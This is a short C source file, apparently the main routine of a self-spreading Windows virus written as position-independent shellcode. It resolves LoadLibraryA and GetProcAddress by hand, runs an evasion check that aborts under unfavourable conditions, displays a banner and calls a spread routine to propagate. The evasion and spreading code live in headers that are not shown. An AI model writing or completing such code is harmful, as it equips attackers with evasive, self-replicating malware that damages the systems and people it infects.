#include <Windows.h>

#include "banner.h"
#include "evade.h"
#include "prototype.h"
#include "spread.h"

int shellcode() {
    HANDLE kernel32 = getModuleByName(L"Kernel32.dll");
    LPVOID _LoadLibraryA = getFuncByName(kernel32, "LoadLibraryA");
    LPVOID _GetProcAddress = getFuncByName(kernel32, "GetProcAddress");

    if (isFuckedUp(_LoadLibraryA, _GetProcAddress)) {
        return 0;
    }

    banner(_LoadLibraryA, _GetProcAddress);
    spread(kernel32, _LoadLibraryA, _GetProcAddress);

    return 0;
}

// int main() { shellcode(); }
